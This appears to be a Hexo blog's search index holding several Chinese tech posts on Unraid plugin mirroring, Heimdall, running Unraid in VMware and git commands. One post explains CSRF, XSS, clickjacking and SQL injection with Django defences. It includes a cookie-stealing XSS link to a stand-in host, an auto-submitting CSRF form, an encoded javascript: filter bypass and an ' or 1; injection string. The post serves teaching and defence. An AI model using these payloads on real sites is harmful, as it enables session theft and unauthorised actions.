<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Unraid community application 插件镜像</title>
      <link href="/posts/3660125672.html"/>
      <url>/posts/3660125672.html</url>
      
        <content type="html"><![CDATA[<div class="note danger flat"><p>忙于毕业，本项目暂停。</p></div><p>Unraid的<code>Community Applications</code>插件（下文简称CA）应该是必装插件了，然而由于托管于github，对国内用户不太友好。偶然间在B站看到了加速商店的方法（<a href="https://www.bilibili.com/video/BV15Z4y1P7Qw">unraid保姆级修改APP商店加速_哔哩哔哩_bilibili</a>），了解到可以通过修改<code>paths.php</code>中的url来加速商店的访问速度。稍微看了下插件代码，花了一点点时间写了个python脚本自动修改插件的相关url地址。</p><p>项目地址：<a href="https://gitee.com/maxiaowei/community.applications">maxiaowei/community.applications (gitee.com)</a></p><h1>主要改动</h1><p>对于官方的CA仓库（<a href="https://github.com/Squidly271/community.applications">Squidly271/community.applications (github.com)</a>），主要做了如下修改：</p><ul><li>修改<code>plugins/community.applications.plg</code>（即插件安装脚本）中的<code>pluginURL </code>和其他相关url为gitee的链接</li><li>修改<code>paths.php</code>中的github链接为gitee对应的链接，amazon备用链接未修改</li><li>重新计算文件MD5值，打包并替换<code>archive</code>中的插件安装文件</li></ul><p>此外，对插件中使用到的<code>AppFeed</code>仓库也做了同步，地址：<a href="https://gitee.com/maxiaowei/appfeed">AppFeed (gitee.com)</a>，并使用jsdelivr cdn替换了github链接。由于cdn缓存需要时间，APP商店中的模板更新会比github慢。</p><h1>注意</h1><div class="note danger flat"><p>本人不会php，也没有多余的机器做测试，不能保证对文件的修改是安全的，在安装或升级本插件前请提前备份系统。</p></div><ol><li>安装插件时，安装的是plg文件中指定的版本的插件，插件的本体在<code>archive</code>目录中，而本项目仅打包<code>archive</code>中最新的插件包，所以很大可能在安装插件时，安装的仍然是旧版本的未经替换的官方包。以当前时间为例，<code>community.applications.plg</code>中指定的安装版本是<code>2022.03.17a</code>，而仓库中已经有了<code>2022.03.20</code>版本的包，安装使用的<code>03.17a</code>版本的包仍然是官方的未修改的包，访问商店仍然会有网络问题。</li><li>针对上述问题，本人已经建立了备份仓库，以后打包的每个版本都会建立备份，在更新CA时会同步将已备份的包替换掉官方的包。</li><li>打包工具<code>makepkg</code>是slackware这一Linux发行版中的，本人对这一工具以及slackware均不熟悉，参考了官方的打包指令，不保证最终制作出来的包是有效的。</li></ol><h1>使用方法</h1><p>和官方插件的安装方式一样，URL为https://gitee.com/maxiaowei/community.applications/raw/master/plugins/community.applications.plg</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202203221802413.png!def" alt="image-20220322180231229"></p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202203221807341.png!def" alt="image-20220322180715258"></p>]]></content>
      
      
      <categories>
          
          <category> nas </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unraid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决heimdall无法刷新app列表的问题</title>
      <link href="/posts/2391406559.html"/>
      <url>/posts/2391406559.html</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://www.reddit.com/r/selfhosted/comments/o20n1z/heimdall_no_applications_updating_list_does_not/">Heimdall - no applications, updating list does not work : selfhosted (reddit.com)</a></p><p>最近通过docker安装heimdall后，发现无法更新app列表。查看docker日志如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2022-03-08 07:11:57][35] Processing: App\Jobs\ProcessApps</span><br><span class="line">[2022-03-08 07:12:00][35] Failed: App\Jobs\ProcessApps</span><br><span class="line"></span><br><span class="line">[2022-03-08 07:12:00][36] Processing: App\Jobs\ProcessApps</span><br><span class="line">[2022-03-08 07:12:02][36] Failed: App\Jobs\ProcessApps</span><br></pre></td></tr></table></figure><p>排除网络原因后，直接访问文件下载地址返回404，猜测是文件下载服务器关闭或出现故障。后发现作者在github上维护了app列表的项目，直接克隆到本地即可。</p><p>参考作者的wiki和reddit上的帖子，步骤如下（基于docker环境）：</p><ol><li>将https://github.com/linuxserver/Heimdall-Apps克隆到<code>SupportedApps</code>目录中，该目录在映射的<code>config</code>目录下的<code>www</code>目录中</li><li>删除所有非app名字的目录和文件，如<code>.git</code>、<code>.github</code>、<code>.gitignore</code>、<code>CNAME</code>等</li><li>运行<code> docker exec -it heimdall bash</code>进入容器</li><li>运行<code>cd /var/www/localhost/heimdall/</code>进入项目目录</li><li>运行<code>php artisan register:app all</code>注册各个app</li><li>如果报错可以选择删除对应的目录，并重新运行上一步的命令</li><li>完成</li></ol><p>由于heimdall注册app对文件格式有一定要求，app名和目录内的相关php文件名字需要一致，在我的注册过程中，<code>WordPress</code>由于其内部的<code>Wordpress.php</code>大小写与目录名不一致，无法通过，修改后即可成功注册。</p>]]></content>
      
      
      <categories>
          
          <category> nas </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heimdall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在VMware中安装unraid系统</title>
      <link href="/posts/3612691073.html"/>
      <url>/posts/3612691073.html</url>
      
        <content type="html"><![CDATA[<h1>起因</h1><p>家里的nas的第一个系统就是unraid，整体体验不错，系统蛮符合我的需求的。只是由于它自带的app商店经常需要科学的方法才能连上，体验不太好，才换成现在的truenas。而现在的truenas社区app的docker镜像地址都换成了<code>tccr.io</code>，不能用dockerhub的镜像加速以后连接速度感人。最近在犹豫是否换回unraid，就准备在虚拟机中尝试下unraid现在的app商店情况如何。</p><p>由于unraid没有提供系统镜像，只能从U盘启动系统，在虚拟机中使用unraid就比较麻烦，百度搜索只搜到一篇安装失败的博客，参考价值不大，只能自己想办法。</p><p>不想看折腾过程的直接看结论即可。</p><h1>过程</h1><h2 id="U盘直通">U盘直通</h2><p>既然unraid需要从U盘启动，就尝试在vm虚拟机的bios中设置U盘启动。然而无效，似乎vmware的bios不能识别unraid的启动U盘。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202203031920676.png!def" alt="设置U盘为第一启动顺序"></p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202203031921417.png!def" alt="启动失败，转到最后的网络启动"></p><p>可以看到由于前三项的启动都失败了，bios转到了最后的网络启动，说明此方法无效。</p><p>后经过搜索，发现需要将U盘转化为vm的硬盘，才可以通过它启动。方法如下：</p><ol><li>打开虚拟机设置界面，选择添加-&gt;硬盘-&gt;SATA类型-&gt;使用物理磁盘。</li></ol><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202203031927795.png!def" alt="image-20220303192754751"></p><ol start="2"><li><p>选择U盘对应的设备，使用情况中选择整个磁盘。</p><div class="note warning flat"><p>需要注意要选对正确的物理驱动器编号，这个编号应该与系统的磁盘管理中的编号是对应的（不确定，在我的电脑中是这样的），U盘的话一般是最后一个。如果不确定的话，在后面能显示选择的物理盘的容量，可以作为参考。</p></div></li></ol><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202203031928171.png!def" alt="image-20220303192853117"></p><ol start="3"><li>确定好磁盘文件的文件名后，U盘的映射就成功了，可以看到多了一块硬盘。</li></ol><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202203031930293.png!def" alt="image-20220303193013259"></p><ol start="4"><li>在bios中将该硬盘放在启动盘的第一位，以确保使用该硬盘启动系统。</li></ol><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202203032243748.png!def" alt="image-20220303224327708"></p><p>至此，应该能够在VM中启动unraid了，但是我遇到了无法通过网络访问unraid的问题。似乎VMware的网络设置对unraid无效，无论是选择桥接还是NAT模式，unraid输出的ip地址都是以<code>169.254</code>开头的地址，均无法连接。通过<code>ifconfig</code>命令查看网络信息，发现没有<code>eth0</code>网卡，仅有<code>br0</code>这一用于docker桥接的网卡，猜测是VMware默认的网卡不被unraid支持。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202203032254169.png!def" alt="image-20220303225447126"></p><h2 id="配置网卡">配置网卡</h2><p>通过一番搜索，在unraid的官方论坛中（<a href="https://forums.unraid.net/topic/50810-trying-unraid-inside-vmware-workstation-eth0-problems/">Trying Unraid inside vmware workstation, eth0 problems - Virtualizing Unraid - Unraid</a>），发现可以通过修改VMware虚拟机的vmx文件来改变虚拟机使用的网卡类型，坛友反应使用<code>ethernet0.virtualDev = &quot;vmxnet&quot;</code>这一配置即可。通过记事本或其他文本编辑软件打开虚拟机文件夹中vmx后缀的文件，找到<code>ethernet0.virtualDev</code>这一配置项，默认应该是<code>e1000</code>，将其修改为<code>vmxnet</code>后重启虚拟机，发现问题依旧没有解决。</p><p>通过该帖子中的链接，发现该网卡最新版本为<code>vmxnet3</code>，尝试修改为<code>vmxnet3</code>后仍然无效。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202203032302403.png!def" alt="image-20220303230240370"></p><h2 id="另一种启动方式">另一种启动方式</h2><p>又经过了一番搜索，找到了ESXI安装unraid的方法<a href="https://www.youtube.com/watch?v=BH892Ye8Gv0">Setting up UNRAID on VMWare ESXI! (2020) - YouTube</a>。在unraid的论坛中也找到了类似的帖子<a href="https://forums.unraid.net/topic/38999-compiled-info-unraid-as-guest-on-esxi/">Compiled Info: unRAID as Guest on ESXi - Virtualizing Unraid - Unraid</a>。两者都提到了利用PlopKexec来加载和启动unraid。关于什么是PlopKexec，下面贴一段官方介绍。</p><blockquote><p>PlopKexec is a Linux Kernel based boot manager for auto detecting and chain loading Linux distributions on USB and CD/DVD drives.</p></blockquote><p>简而言之，PlopKexec可以自动启动在USB/光驱中的Linux系统。在<a href="https://www.plop.at/en/plopkexec/download.html">PlopKexec - Download</a>中下载plopkexec-1.6-bin.tar.gz，解压后得到镜像文件plopkexec.iso。</p><p>重新配置虚拟机，移除之前添加的映射了U盘的硬盘（此步可选），在CD/DVD设备中选择plop镜像文件。</p><div class="note info flat"><p>如果设备状态中的<strong>启动时连接</strong>没有勾上，则需要手动勾上。</p></div><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202203032313904.png!def" alt="image-20220303231321861"></p><p>在bios中将CD-ROM设定为第一启动项，并手动将U盘连接到虚拟机中（如果没有移除U盘映射的硬盘，应该不需要操作）。启动虚拟机，等待plopkexec启动并找到U盘中的unraid系统。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/202203032322301.png!def" alt="image-20220303232243243"></p><p>经过一段时间的等待，plopkexec就找到了unraid系统，可以手动按回车或者等待倒计时结束，就会启动unraid系统。此时系统输出的ip地址正确，可以通过该地址连接到unraid的web页面了，<code>ifconfig</code>中也出现了eth0网卡。终于可以愉快地在虚拟机中使用unraid 了。</p><p>如果plopkexec没有找到unraid，可以尝试下拔插U盘、重新启动虚拟机、修改虚拟机中USB控制器版本等操作，再行尝试。</p><h1>总结</h1><p>下面对unraid的安装步骤做一个总结。</p><ol><li>下载Plopkexec，指定unraid虚拟机的CD驱动器使用该iso镜像文件。</li><li>虚拟机的bios设置CD-ROM为第一启动顺序，利用plopkexec加载unraid的U盘。</li><li>完成。</li></ol><p>经过测试，unraid支持默认的e1000网卡，所以上一节中修改网卡类型这一步骤不是必须的，且暂时不知道两种网卡的区别。</p><p>由于有了plopkexec，上一节中将U盘转化为磁盘的操作也不是必须的。</p><h1>参考</h1><ol><li><a href="https://forums.unraid.net/topic/38999-compiled-info-unraid-as-guest-on-esxi/">Compiled Info: unRAID as Guest on ESXi - Virtualizing Unraid - Unraid</a>，该帖子中还提到了直接使用VMDK制作虚拟机的方式，但是仅提供了6.2.3及以前的版本。</li><li><a href="https://www.reddit.com/r/unRAID/comments/798dct/run_unraid_as_a_vm_in_virtualbox_within_windows_10/">Run unRAID as a VM in VirtualBox within Windows 10 : unRAID (reddit.com)</a></li><li><a href="https://forums.unraid.net/topic/50810-trying-unraid-inside-vmware-workstation-eth0-problems/">Trying Unraid inside vmware workstation, eth0 problems - Virtualizing Unraid - Unraid</a></li><li><a href="https://superuser.com/questions/221365/how-can-i-find-modify-the-type-of-my-virtual-network-adapter-installed-with-vmwa">How can I find/modify the type of my virtual network adapter installed with VMware Workstation? - Super User</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> nas </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unraid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简述几种经典的网络攻击方式</title>
      <link href="/posts/2189133327.html"/>
      <url>/posts/2189133327.html</url>
      
        <content type="html"><![CDATA[<p>最近在查看Django安全性方面的文档：<a href="https://docs.djangoproject.com/zh-hans/3.2/topics/security/">Django 的安全性 </a>，发现针对过去经典的四大攻击方式都有相应的防护策略，结合之前学习的郭老师（知乎@<a href="https://www.zhihu.com/people/ustcsse308">ustcsse308</a>）的信息安全实践课程，本文对这几个攻击方式做个总结。</p><h1>CSRF：跨站请求伪造</h1><h2 id="原理">原理</h2><p>CSRF全称是Cross-Site Request Forgery，根据字面意思来理解，就是攻击者伪造了用户的请求，这种攻击方式主要依靠的是<code>cookie</code>。</p><p>由于HTTP协议是一种无状态协议，服务器无法直接依据用户的请求来识别用户，因此需要在本次存储一段可以识别用户信息的文本，当用户向服务器发送请求时，同时携带该段文本信息，服务器即可据此识别出用户身份，这就是<code>cookie</code>的主要用途。</p><p>因此，只要拿到用户的<code>cookie</code>，任何人都可以利用它与服务器通信。对此，浏览器有一个功能，即在用户发起请求时，仅会携带与请求站点相关的<code>cookie</code>，保证用户访问的站点无法获得用户本地存储的其他站点的cookie。</p><p>那么，这种保护措施是否足够安全了呢？显然答案是否定的，攻击者可以构造出一个页面，在页面内发起对被攻击页面的请求，这样浏览器在发送请求时仍然会携带对应的<code>cookie</code>，用户就会被攻击。</p><p>下面来看一个示例，由于<code>GET</code>请求会将请求信息填充在<code>url</code>中，很容易被攻击，因此现在大部分有安全要求的请求都会使用<code>POST</code>方式。但是由于浏览器可以检查页面源码，可以很容易地知道请求的表单构成，攻击者只要据此伪造一个表单请求即可。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF MYZOO<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;frame&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none&quot;</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myframe&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>HHH<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> f = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;form&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        f.<span class="property">method</span> = <span class="string">&quot;POST&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        f.<span class="property">action</span> = <span class="string">&quot;http://localhost:8080/transfer.php&quot;</span> <span class="comment">// 被攻击页面</span></span></span><br><span class="line"><span class="language-javascript">        f[<span class="string">&quot;target&quot;</span>] = <span class="string">&quot;frame&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        f.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;inline&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        f.<span class="property">id</span> = <span class="string">&quot;myForm&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> i = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;input&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        i.<span class="property">type</span> = <span class="string">&quot;hidden&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        i.<span class="property">name</span> = <span class="string">&quot;zoobars&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        i.<span class="property">value</span> = <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">        f.<span class="title function_">appendChild</span>(i);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> i = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;input&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        i.<span class="property">type</span> = <span class="string">&quot;hidden&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        i.<span class="property">name</span> = <span class="string">&quot;recipient&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        i.<span class="property">value</span> = <span class="string">&quot;csrf&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        f.<span class="title function_">appendChild</span>(i);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> i = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;input&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        i.<span class="property">type</span> = <span class="string">&quot;hidden&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        i.<span class="property">name</span> = <span class="string">&quot;submission&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        i.<span class="property">value</span> = <span class="string">&quot;Send&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        f.<span class="title function_">appendChild</span>(i);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(f);</span></span><br><span class="line"><span class="language-javascript">        f.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用JS自动构建和提交表单，只要用户访问该网站，就会被攻击，向攻击者转钱。这段代码在<code>Edge</code>浏览器上无法有效运行，因为浏览器默认不会给跨域的POST请求添加<code>cookie</code>，但是在<code>IE</code>上只要允许脚本运行，该段代码仍然可以正常工作。理论上通过其他前端技术，应该可以实现类似效果，但是本人不会前端技术，本文也仅是说明攻击原理，因此不再展开。</p><h2 id="防御">防御</h2><p>那么，如何防范这种攻击呢？由于<code>CSRF</code>使用<code>cookie</code>进行攻击，因此最简单的方式就是在每次浏览网站后删除对应的<code>cookie</code>（如手动登出站点），但是这种方法不利于良好的用户体验，主要的解决方法还是要在服务器端想办法。现在的问题是攻击者太容易构造请求表单了，因此只要增加表单的构造难度即可，一个简单的方法就是在提交的表单中加入一个隐藏的随机字段，每次服务器处理表单时验证该字段即可。</p><p>一种防御手段是在<code>cookie</code>中存储一个随机字段，并且在发送请求时，前端读取<code>cookie</code>中的该字段并随请求一同发送。由于同源策略，恶意网站无法直接读取<code>cookie</code>，也就无法在请求中正确构造该字段，即可达到防御效果。除此以外，还可以通过<code>session</code>方式生成和存储加密字段。</p><p>而Django中，会有一个基于随机密钥值的<code>CSRF cookie</code>，同时在表单中有一个名为<code>csrfmiddlewaretoken</code>的隐藏字段，该字段是被掩码加密的密钥值，表单提交后，服务器会比较<code>cookie</code>和表单中的字段值，以确认本次请求是否合法。</p><h1>XSS：跨站脚本</h1><h2 id="原理-2">原理</h2><p>全称为Cross Site Scripting，简称不是CSS是为了与Cascading Style Sheets做区分。</p><blockquote><p>XSS攻击是发生在<strong>目标用户的浏览器</strong>上的，当渲染DOM树的过程中执行了<strong>不该</strong>执行的JS代码时，就发生了XSS攻击。</p></blockquote><p>简单来说，站点在渲染页面时，没有对页面信息进行过滤，而将一些用于攻击的JS代码渲染出来。</p><p>假设网站提供了一个页面用于展示用户的个人信息，那么攻击者将攻击代码写在个人信息处，当其他人访问攻击者的个人页面时，页面就会渲染攻击代码，窃取用户信息。</p><p>举个简单的例子，假设攻击者的个人页面如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;id&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> aLink = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;id&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">aLink.<span class="property">href</span>=<span class="string">&quot;http://www.xss.com/steal.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么，正常用户访问该页面时，会将自己的<code>cookie</code>发送到攻击者的服务器中去。</p><h2 id="防御-2">防御</h2><p>针对这种攻击的防御说起来很简单：输入过滤，输出转义。但是做起来比较困难。以php为例，有个<code>strip_tag</code>函数可以过滤指定的html标签，但是这还远远不够。攻击者可以将一些标签编码，这样就无法识别到指定的标签进行过滤了，如：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6A;avascript:alert(1)</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中，<code>&amp;#x6A;</code>在html中称为字符实体，对应与字符<code>j</code>，这种情况下函数就无法有效过滤了。</p><p>在Django中，模板系统默认开启了html转义功能，同时也可以使用<code>escape</code>标签手动进行转义。它主要转义<code>&lt;</code>、<code>&gt;</code>、<code>'</code>、<code>&quot;</code>和<code>&amp;</code>这五个字符。</p><h1>Clickjacking：点击劫持</h1><h2 id="原理-3">原理</h2><p>这种攻击方式的原理很简单，就是用恶意网页覆盖被攻击的网页，让用户误以为在操作展示的网页，而实际是在操作被攻击的网页，从而造成损失。</p><p>攻击者只需要在自己的页面上嵌入一个<code>iframe</code>，引用被攻击的页面。将<code>frame</code>的<code>opacity</code>设置为0，那么用户就无法看到该<code>frame</code>。同时，将攻击页面的<code>z-index</code>设置为-1，以置于被攻击页面之下。在这种情况下，用户看到的是下层的恶意页面，而进行操作时，却是操作的位于上层的透明的被攻击页面。</p><p>一个简单的攻击页面构成如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h1</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: -<span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">iframe</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: <span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">opacity</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>显示用户看到的界面<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;www.baidu.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者只要精心构造攻击页面，使之与上层被攻击页面（即<code>iframe</code>）中的页面对应，即可达到攻击目的。</p><p>简单的图示如下：</p><p><img src="https://pic1.zhimg.com/v2-ffc85bd3f7f5f7fadd85bc8a44fe4c24_r.jpg" alt=""></p><h2 id="防御-3">防御</h2><p>想要防御这种攻击方式，最先想到的就是阻止自身被加载到<code>iframe</code>中，但是单单通过JS代码很难实现。后来，结合浏览器的安全机制，可以在响应头中加入<code>X-Frame-Options</code>字段，告诉浏览器不能将该页面载入到<code>iframe</code>中。</p><p>该字段有3个选项：</p><ul><li>DENY：任何网页都不能使用<code>iframe</code> 载入该页面</li><li>SAMEORIGIN：符合同源策略的网页可以使用<code>iframe</code>载入该页面</li><li>ALLOW-FROM uri：指定来源的网页可以使用<code>iframe</code> 载入该页面</li></ul><h1>SQL注入</h1><h2 id="原理-4">原理</h2><p>想象一下，网站在验证用户的登录信息时，需要去数据库检查用户名和密码，一个简单的查询语句如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM Person WHERE UserName=&#x27;<span class="subst">$username</span>&#x27; and Password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>网站通过sql返回的值来判断用户提供的登录信息是否正确。那么，只要攻击者想办法让数据库可以返回非空的信息，即可在不知道密码的情况下登陆网站。</p><p>在SQL中，有<code>and</code>、<code>or</code>等逻辑操作符，我们只要在<code>password</code>中传入<code>' or 1;</code>，构造出的查询语句为：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Person <span class="keyword">WHERE</span> UserName<span class="operator">=</span><span class="string">&#x27;sql&#x27;</span> <span class="keyword">and</span> Password<span class="operator">=</span><span class="string">&#x27; or 1;&#x27;</span></span><br></pre></td></tr></table></figure><p>那么，数据库会返回所有的用户信息，也就攻击成功了。</p><p>在攻击者已知网站的数据库查询语句构造的情况下，可以很容易地构造出攻击字串。然而，大多数情况下，攻击者是难以知道查询语句或数据库的构成的，此时攻击者可以通过出错信息、盲注等手段，根据查询时的表现来猜测数据库的名字、字段等信息。</p><h2 id="防御-4">防御</h2><p>这种攻击的防御主要还是依靠对用户输入的信息进行识别和过滤，在执行sql之前对sql语句进行检查。</p><blockquote><p>Django 的 querysets 在被参数化查询构建出来时就被保护而免于 SQL 注入。查询的 SQL 代码与查询的参数是分开定义的。参数可能来自用户从而不安全，因此它们由底层数据库引擎进行转义。</p></blockquote><h1>参考</h1><ol><li><a href="https://www.zhihu.com/column/c_1043524379795308544">Web安全实践课程 - 知乎 (zhihu.com)</a></li><li><a href="https://docs.djangoproject.com/zh-hans/3.2/topics/security/">Django 的安全性 | Django 文档 | Django (djangoproject.com)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
            <tag> XSS </tag>
            
            <tag> Clickjacking </tag>
            
            <tag> SQL injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git常用操作</title>
      <link href="/posts/807237865.html"/>
      <url>/posts/807237865.html</url>
      
        <content type="html"><![CDATA[<p>推荐一个学习git的网站：<a href="https://learngitbranching.js.org/?locale=zh_CN">Learn Git Branching</a>。</p><p>本文记录学习git时总结的一些常用操作，如有错误欢迎在评论区指正。下文图中的c0,c1,…cn实际使用中为提交记录的hash值。</p><h1>分支操作</h1><h2 id="新建分支：branch和checkout">新建分支：branch和checkout</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建分支</span></span><br><span class="line">git branch &lt;bname&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换分支</span></span><br><span class="line">git checkout &lt;bname&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建并切换分支，实际上是上面两条命令的组合</span></span><br><span class="line">git checkout -b &lt;bname&gt;</span><br></pre></td></tr></table></figure><p>此外，自<code>2.23</code>版本开始，<code>git</code>添加了<code>switch</code>命令，用于切换分支：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span 